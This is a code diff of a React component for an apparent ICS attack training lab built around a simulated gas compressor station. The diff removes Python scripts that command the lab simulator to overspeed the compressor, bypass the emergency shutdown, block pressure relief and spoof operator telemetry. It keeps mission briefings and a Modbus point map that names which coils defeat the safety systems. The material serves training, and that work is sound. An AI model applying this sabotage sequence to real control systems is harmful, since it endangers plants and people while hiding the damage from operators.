@@ -1,5 +1,5 @@
 /**
- * PipelineLabMonitor — Lab Monitor for Meridian Compressor Station 7 (DNP3)
+ * PipelineLabMonitor — Lab Monitor for Redwater Compressor Station (Modbus/TCP)
  * 4-phase attack scenario inspired by PIPEDREAM/INCONTROLLER (CISA AA22-103A, 2022)
  * and TRISIS/TRITON (2017, Schneider Triconex SIS attack, Saudi Arabia)
  */
@@ -20,8 +20,6 @@ interface Mission {
   difficulty: "BEGINNER" | "INTERMEDIATE" | "ADVANCED" | "EXPERT";
   objective: string;
   background: string;
-  tool: string;
-  steps: { label: string; code: string; note?: string }[];
   successCondition: string;
   impact: string[];
 }
@@ -30,114 +28,29 @@ const MISSIONS: Mission[] = [
   {
     id: "recon",
     phase: 1,
-    title: "DNP3 Outstation Reconnaissance",
+    title: "Modbus RTU Reconnaissance",
     difficulty: "BEGINNER",
-    objective: "Discover the DNP3 outstation and run a Class 0 integrity poll to map every point",
-    background: `DNP3 has no default authentication — Secure Authentication (SAv5) exists in the
-standard but is almost never deployed in the field. Before PIPEDREAM/INCONTROLLER
+    objective: "Discover the Modbus RTU and read every coil and register to map the compressor process",
+    background: `Modbus has no authentication or encryption whatsoever — any client that can
+open the TCP port can read and write any point. Before PIPEDREAM/INCONTROLLER
 (CISA advisory AA22-103A, 2022) could sabotage gas and electric infrastructure, its
-operators had to enumerate the outstation's object model. A Class 0 integrity poll
-is exactly what a real DNP3 master does on first connecting to a field device —
-it dumps every static point in one shot.`,
-    tool: "python3 / netcat",
-    steps: [
-      {
-        label: "Step 1 — Port scan",
-        code: `# DNP3 standard port is 20000, training uses 5023
-nmap -sT -p 5023 localhost`,
-      },
-      {
-        label: "Step 2 — Connect and identify the outstation",
-        code: `python3 << 'EOF'
-import socket, json
-
-s = socket.socket()
-s.connect(('localhost', 5023))
-banner = json.loads(s.recv(4096))
-print("Banner:", json.dumps(banner, indent=2))
-
-def cmd(c):
-    s.send((json.dumps(c) + '\\n').encode())
-    return json.loads(s.recv(65536))
-
-print("\\nIdentify:")
-print(json.dumps(cmd({"cmd": "identify"}), indent=2))
-EOF`,
-      },
-      {
-        label: "Step 3 — Class 0 integrity poll (enumerate every point)",
-        code: `python3 << 'EOF'
-import socket, json
-
-s = socket.socket()
-s.connect(('localhost', 5023))
-s.recv(4096)  # banner
-
-def cmd(c):
-    s.send((json.dumps(c) + '\\n').encode())
-    return json.loads(s.recv(65536))
-
-data = cmd({"cmd": "read_class0"})
-print(f"Found {data['count']} points\\n")
-
-print("Analog Inputs (Group 30 — measurements):")
-for ref, v in data['analog_inputs'].items():
-    print(f"  {ref:8s}  {v['name']:22s}  {v['value']:>10}  {v['unit']}")
-
-print("\\nBinary Outputs (Group 12 CROB — ATTACK TARGETS, writable):")
-for ref, v in data['binary_outputs'].items():
-    print(f"  {ref:8s}  {v['name']:24s}  {v['value']!s:8s}  {v['desc']}")
-
-print("\\nAnalog Outputs (Group 40 — ATTACK TARGETS, writable):")
-for ref, v in data['analog_outputs'].items():
-    print(f"  {ref:8s}  {v['name']:22s}  {v['value']}  {v['unit']}")
-EOF`,
-        note: "Notice G12V5 (telemetry_spoofed) — an undocumented engineering point, exactly the kind of hidden god-mode bit real ICS devices sometimes ship with",
-      },
-    ],
-    successCondition: "Connected without authentication and enumerated all AI/BI/BO/AO points",
-    impact: ["Receive outstation banner with no credentials", "List every writable Binary/Analog Output", "Identify esd_armed, prv_block_valve_closed, rpm_setpoint, and telemetry_spoofed as attack targets"],
+operators first enumerated the field device's memory map. Reading all four Modbus
+tables (coils, discrete inputs, input registers, holding registers) with a tool
+like mbpoll dumps the entire process state in seconds.`,
+    successCondition: "Connected without authentication and read all coils, inputs, and registers",
+    impact: ["Connect to port 5023 with no credentials", "List every writable coil and holding register", "Identify esd_armed (coil 0), prv_block_valve_closed (coil 1), rpm_setpoint (HR 0), and telemetry_spoofed (coil 5) as attack targets"],
   },
   {
     id: "setpoint",
     phase: 2,
     title: "Setpoint Manipulation",
     difficulty: "INTERMEDIATE",
-    objective: "Direct-Operate the compressor RPM setpoint past safe limits and observe the safety system respond",
+    objective: "Write the compressor RPM setpoint (holding register) past safe limits and watch the safety system respond",
     background: `A naive attacker jumps straight to sabotage. Push the compressor setpoint hard
 and the plant's own protection will likely catch it — the ESD trips the compressor
 and opens the blowdown valve before real damage occurs. This is the lesson: a
-single Direct Operate write against an unguarded point is not enough. Defense in
+single register write against an unguarded point is not enough. Defense in
 depth exists precisely to absorb exactly this kind of attack.`,
-    tool: "python3",
-    steps: [
-      {
-        label: "Step 1 — Overspeed the compressor (Analog Output G40V0)",
-        code: `python3 << 'EOF'
-import socket, json, time
-
-s = socket.socket()
-s.connect(('localhost', 5023))
-s.recv(4096)
-
-def cmd(c):
-    s.send((json.dumps(c) + '\\n').encode())
-    return json.loads(s.recv(65536))
-
-result = cmd({"cmd": "operate", "group": 40, "index": 0, "value": 12500})
-print("Direct Operate result:", result)
-
-print("\\nPolling discharge pressure / RPM / ESD state...")
-for _ in range(15):
-    r = cmd({"cmd": "read_point", "group": 30, "index": 1})   # discharge_pressure
-    p = cmd({"cmd": "read_point", "group": 30, "index": 2})   # compressor_rpm
-    e = cmd({"cmd": "read_point", "group": 1,  "index": 3})   # esd_tripped
-    print(f"  discharge={r['value']:7.1f} psi   rpm={p['value']:7.0f}   esd_tripped={e['value']}")
-    time.sleep(1)
-EOF`,
-        note: "With ESD armed (default), it trips before pressure reaches rupture territory — the compressor stops itself",
-      },
-    ],
     successCondition: "ESD trips (esd_tripped=true) before any lasting damage — the safety system did its job",
     impact: ["compressor_rpm climbs then drops to 0", "Blowdown valve opens automatically", "Lesson: single-point sabotage against an armed SIS just triggers a safe shutdown"],
   },
@@ -156,75 +69,6 @@ closed. Real-world precedent for defeating a mechanical relief valve: the 2005
 BP Texas City disaster, caused in part by a blocked-in relief valve.
 
 "Don't just break things. Break the things that prevent things from breaking."`,
-    tool: "python3",
-    steps: [
-      {
-        label: "Step 1 — Bypass the ESD (Binary Output G12V0)",
-        code: `python3 << 'EOF'
-import socket, json
-
-s = socket.socket()
-s.connect(('localhost', 5023))
-s.recv(4096)
-
-def cmd(c):
-    s.send((json.dumps(c) + '\\n').encode())
-    return json.loads(s.recv(65536))
-
-result = cmd({"cmd": "operate", "group": 12, "index": 0, "value": False})
-print("ESD bypass result:", result)
-print("Layer 1 is down. The compressor will no longer self-protect.")
-EOF`,
-      },
-      {
-        label: "Step 2 — Close the PRV isolation valve (Binary Output G12V1)",
-        code: `python3 << 'EOF'
-import socket, json
-
-s = socket.socket()
-s.connect(('localhost', 5023))
-s.recv(4096)
-
-def cmd(c):
-    s.send((json.dumps(c) + '\\n').encode())
-    return json.loads(s.recv(65536))
-
-result = cmd({"cmd": "operate", "group": 12, "index": 1, "value": True})
-print("PRV isolation result:", result)
-print("Layer 2 is down. There is no fail-safe left between the pipe and rupture.")
-EOF`,
-        note: "Watch the Station View: both the ESD badge and PRV-BLK valve symbol turn red",
-      },
-      {
-        label: "Step 3 — Close the blowdown valve, then re-attempt the overspeed",
-        code: `python3 << 'EOF'
-import socket, json, time
-
-s = socket.socket()
-s.connect(('localhost', 5023))
-s.recv(4096)
-
-def cmd(c):
-    s.send((json.dumps(c) + '\\n').encode())
-    return json.loads(s.recv(65536))
-
-# If Phase 2's trip already opened the blowdown/vent valve, it stays open
-# until someone commands it shut — the ESD bypass does not do this for you.
-cmd({"cmd": "operate", "group": 12, "index": 4, "value": False})
-print("Blowdown valve closed. Discharge can build pressure again.")
-
-cmd({"cmd": "operate", "group": 40, "index": 0, "value": 13500})
-print("Setpoint pushed to 13,500 RPM with both safety layers disabled.")
-print("Polling pipe stress...")
-for _ in range(20):
-    stress = cmd({"cmd": "read_point", "group": 30, "index": 6})
-    pres   = cmd({"cmd": "read_point", "group": 30, "index": 1})
-    print(f"  pipe_stress={stress['value']:5.1f}%   discharge={pres['value']:7.1f} psi")
-    time.sleep(1)
-EOF`,
-        note: "Pipe stress will now climb unchecked toward rupture — nothing is left to stop it",
-      },
-    ],
     successCondition: "esd_armed=false AND prv_block_valve_closed=true AND pipe_stress climbing past 50%",
     impact: ["Both defense-in-depth layers defeated", "Discharge pressure sustained above 1,540 psi with no relief", "Pipe stress index climbs steadily toward the 100% rupture threshold"],
   },
@@ -239,61 +83,10 @@ as the most versatile ICS attack toolkit ever publicly documented — purpose-bu
 to manipulate PLCs and safety controllers in energy infrastructure while evading
 detection. The same principle drove Stuxnet (2010): it fed Iranian operators
 fabricated "normal" centrifuge telemetry while the real machines spun themselves
-to failure. This outstation has an undocumented diagnostic point (G12V5) that
-freezes every value the DNP3 master and operator HMI receive. Activate it, and
+to failure. This RTU has an undocumented diagnostic coil (coil 5) that
+freezes every value the Modbus master and operator HMI receive. Activate it, and
 the Control Room screen will show nominal pressure, RPM, and vibration —
 indefinitely — no matter what actually happens to the pipe.`,
-    tool: "python3",
-    steps: [
-      {
-        label: "Step 1 — Activate telemetry spoofing (Binary Output G12V5)",
-        code: `python3 << 'EOF'
-import socket, json
-
-s = socket.socket()
-s.connect(('localhost', 5023))
-s.recv(4096)
-
-def cmd(c):
-    s.send((json.dumps(c) + '\\n').encode())
-    return json.loads(s.recv(65536))
-
-result = cmd({"cmd": "operate", "group": 12, "index": 5, "value": True})
-print("Spoofing activated:", result)
-print("The Control Room and any DNP3 master polling this outstation now see")
-print("frozen 'nominal' values. Open the Lab Monitor's DECEPTION STATUS panel")
-print("to see ground truth alongside what the operator sees.")
-EOF`,
-        note: "Switch to the Control Room tab — it will now show a calm, nominal station no matter what you do next",
-      },
-      {
-        label: "Step 2 — Finish the overspeed / overpressure attack blind",
-        code: `python3 << 'EOF'
-import socket, json, time
-
-s = socket.socket()
-s.connect(('localhost', 5023))
-s.recv(4096)
-
-def cmd(c):
-    s.send((json.dumps(c) + '\\n').encode())
-    return json.loads(s.recv(65536))
-
-# Assumes ESD + PRV isolation were already defeated in Phase 3
-cmd({"cmd": "operate", "group": 40, "index": 0, "value": 14000})
-print("Setpoint at 14,000 RPM. Waiting for structural failure...")
-print("(The operator's screen will not change. This is the point of the attack.)")
-
-for _ in range(30):
-    stress = cmd({"cmd": "read_point", "group": 30, "index": 6})
-    print(f"  ground-truth pipe_stress = {stress['value']:5.1f}%")
-    if stress['value'] >= 100:
-        print("\\nRUPTURE. The operator never saw it coming.")
-        break
-    time.sleep(1)
-EOF`,
-      },
-    ],
     successCondition: "actual.pipeline.ruptured = true while displayed.pipeline still reads nominal",
     impact: [
       "Ground truth (Lab Monitor / actual state): catastrophic pipeline rupture",
@@ -309,27 +102,6 @@ const DIFF_COLORS: Record<string, string> = {
   ADVANCED:     "bg-orange-900/50 text-orange-300 border-orange-700",
   EXPERT:       "bg-red-900/60 text-red-300 border-red-700",
 };
-
-function CopyButton({ text }: { text: string }) {
-  const [copied, setCopied] = useState(false);
-  return (
-    <button
-      onClick={() => {
-        navigator.clipboard.writeText(text).then(() => {
-          setCopied(true);
-          setTimeout(() => setCopied(false), 1500);
-        });
-      }}
-      className={`px-2 py-0.5 rounded text-[9px] font-mono border transition-colors ${
-        copied
-          ? "border-green-700 text-green-400 bg-green-900/20"
-          : "border-gray-700 text-gray-400 hover:text-gray-200 hover:border-gray-600"
-      }`}
-    >
-      {copied ? "Copied!" : "Copy"}
-    </button>
-  );
-}
 
 export function PipelineLabMonitor({ displayed, actual }: Props) {
   const [selectedMission, setSelectedMission] = useState(0);
@@ -360,7 +132,7 @@ export function PipelineLabMonitor({ displayed, actual }: Props) {
         <div>
           <h1 className="text-xl font-mono font-bold text-orange-400">LAB MONITOR</h1>
           <p className="text-sm font-mono text-gray-500">
-            Meridian Compressor Station 7 — Attack via DNP3, observe ground-truth impact here
+            Redwater Compressor Station: Attack via Modbus, observe ground-truth impact here
           </p>
         </div>
         <div className="flex gap-2">
@@ -368,7 +140,7 @@ export function PipelineLabMonitor({ displayed, actual }: Props) {
             onClick={() => setShowPointMap(!showPointMap)}
             className="bg-gray-800 hover:bg-gray-700 text-gray-300 px-3 py-2 rounded font-mono text-xs border border-gray-700"
           >
-            {showPointMap ? "HIDE" : "SHOW"} DNP3 POINT MAP
+            {showPointMap ? "HIDE" : "SHOW"} MODBUS POINT MAP
           </button>
           <button
             onClick={resetSystem}
@@ -382,33 +154,33 @@ export function PipelineLabMonitor({ displayed, actual }: Props) {
       {showPointMap && (
         <div className="bg-gray-900 rounded-lg p-3 border border-gray-800 mb-4">
           <h3 className="text-xs font-mono text-cyan-400 mb-2 font-bold">
-            DNP3 POINT MAP — Meridian CS7 Outstation (MERIDIAN-CS7-RTU1)
+            MODBUS POINT MAP — Redwater Compressor Station (Unit ID 1)
           </h3>
           <div className="flex gap-2 mb-2 text-[10px] font-mono text-gray-500">
-            <span>Protocol: <span className="text-cyan-400">DNP3</span></span>
+            <span>Protocol: <span className="text-cyan-400">Modbus/TCP</span></span>
             <span>|</span>
             <span>Port: <span className="text-cyan-400">TCP 5023</span></span>
             <span>|</span>
-            <span>Auth: <span className="text-red-400">None / No Secure Authentication</span></span>
+            <span>Auth: <span className="text-red-400">None</span></span>
           </div>
           <table className="w-full text-xs font-mono">
             <thead>
               <tr className="text-gray-500 border-b border-gray-800">
-                <th className="text-left p-1">Point Ref</th>
-                <th className="text-left p-1">Group</th>
+                <th className="text-left p-1">Address</th>
+                <th className="text-left p-1">Table (FC)</th>
                 <th className="text-left p-1">Access</th>
                 <th className="text-left p-1">Description</th>
               </tr>
             </thead>
             <tbody>
               {[
-                ["G30V0–V6", "Analog Input",  "R", "Pressure, RPM, temp, vibration, flow, pipe stress"],
-                ["G1V0–V8",  "Binary Input",  "R", "Valve/ESD/PRV status, alarms, rupture flag"],
-                ["G12V0",    "Binary Output", "W", "ATTACKABLE — esd_armed (SIS bypass)"],
-                ["G12V1",    "Binary Output", "W", "ATTACKABLE — prv_block_valve_closed"],
-                ["G12V2–V4", "Binary Output", "W", "ATTACKABLE — valve commands"],
-                ["G12V5",    "Binary Output", "W", "UNDOCUMENTED — telemetry_spoofed"],
-                ["G40V0",    "Analog Output", "W", "ATTACKABLE — rpm_setpoint"],
+                ["IR 0–6",   "Input Register (04)",  "R", "Suction/discharge pressure, RPM, temp, vibration, flow, pipe stress"],
+                ["DI 0–9",   "Discrete Input (02)",  "R", "Valve/ESD/PRV status, alarms, rupture flag"],
+                ["Coil 0",   "Coil (01/05)",         "W", "ATTACKABLE — esd_armed (write 0 = bypass SIS)"],
+                ["Coil 1",   "Coil (01/05)",         "W", "ATTACKABLE — prv_block_valve_closed (write 1 = block relief)"],
+                ["Coil 2–4", "Coil (01/05)",         "W", "ATTACKABLE — suction / discharge / blowdown valve commands"],
+                ["Coil 5",   "Coil (01/05)",         "W", "UNDOCUMENTED — telemetry_spoofed (write 1 = freeze HMI)"],
+                ["HR 0",     "Holding Register (03/06)", "W", "ATTACKABLE — rpm_setpoint"],
               ].map(([ref, group, rw, desc]) => (
                 <tr key={ref} className={`border-b border-gray-800/30 ${rw === "W" ? "text-red-300" : "text-gray-300"}`}>
                   <td className="p-1 text-cyan-400">{ref}</td>
@@ -421,7 +193,10 @@ export function PipelineLabMonitor({ displayed, actual }: Props) {
               ))}
             </tbody>
           </table>
-          <p className="text-[10px] text-red-400 mt-2">Red rows = writable (attackable) — no authentication required</p>
+          <p className="text-[10px] text-red-400 mt-2">
+            Red rows = writable (attackable) — no authentication required. Any Modbus master (mbpoll,
+            Metasploit) can read or write every point.
+          </p>
         </div>
       )}
 
@@ -442,7 +217,7 @@ export function PipelineLabMonitor({ displayed, actual }: Props) {
       </div>
 
       <div className="grid grid-cols-3 gap-3">
-        {/* Left: Mission briefing + commands */}
+        {/* Left: Mission briefing */}
         <div className="col-span-2 space-y-3">
           <div className="bg-gray-900 rounded-lg p-4 border border-gray-800">
             <div className="flex justify-between items-start mb-3">
@@ -472,30 +247,6 @@ export function PipelineLabMonitor({ displayed, actual }: Props) {
                   <li key={i} className="flex gap-2"><span className="text-blue-500">-</span> {item}</li>
                 ))}
               </ul>
-            </div>
-          </div>
-
-          <div className="bg-black rounded-lg border border-gray-800 overflow-hidden">
-            <div className="px-4 py-2 border-b border-gray-800">
-              <h3 className="text-xs font-mono text-green-400 font-bold">COMMANDS — Run these in your terminal</h3>
-            </div>
-            <div className="p-4 space-y-4">
-              {mission.steps.map((step, i) => (
-                <div key={i}>
-                  <div className="flex items-center justify-between mb-1">
-                    <span className="text-xs font-mono text-gray-400 font-bold">{step.label}</span>
-                    <CopyButton text={step.code} />
-                  </div>
-                  <pre className="text-xs font-mono text-green-400 overflow-x-auto whitespace-pre bg-gray-950/50 p-2 rounded">
-                    {step.code}
-                  </pre>
-                  {step.note && (
-                    <p className="text-[10px] font-mono text-blue-400 mt-1 pl-2 border-l border-blue-800">
-                      ℹ {step.note}
-                    </p>
-                  )}
-                </div>
-              ))}
             </div>
           </div>
         </div>
